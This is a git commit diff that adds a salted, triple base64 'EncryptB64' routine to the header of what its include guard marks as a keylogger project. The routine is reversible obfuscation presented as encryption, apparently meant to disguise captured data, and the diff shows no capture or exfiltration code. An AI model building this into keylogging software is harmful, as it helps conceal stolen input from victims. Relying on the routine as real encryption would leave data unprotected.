48bc7e41195b5019cce8295ece1c64b51e26eff8
Samuel Bancroft <samuelbancroft@hotmail.com>
2017-06-18 12:54:26 +0100

    Blah bLah blAh blaH

--- Base64.h
+++ Base64.h
@@ -10,6 +10,28 @@
 
 using namespace std;
 
+namespace Base64
+{
+    string base64_encode(const string &);
+
+    const string &SALT1 = "LB::SB::RW::SB::HB";
+    const string &SALT2 = "__//:://__IfItWorks";
+    const string &SALT3 = "22021978150119801609199992104201022022017";
+
+    string EncryptB64(string s)
+    {
+        s = SALT1 + s + SALT2 + SALT3;
+        s = base64_encode(s);
+        s.insert(11, SALT2);
+        s = base64_encode(s);
+        s += SALT3;
+        s = base64_encode(s);
+        s.insert(5, "Q!");
+        s.insert(9, "pp$");
+        return s;
+    }
+}
+
 
 
 #endif //KEYLOGGER_BASE64_H
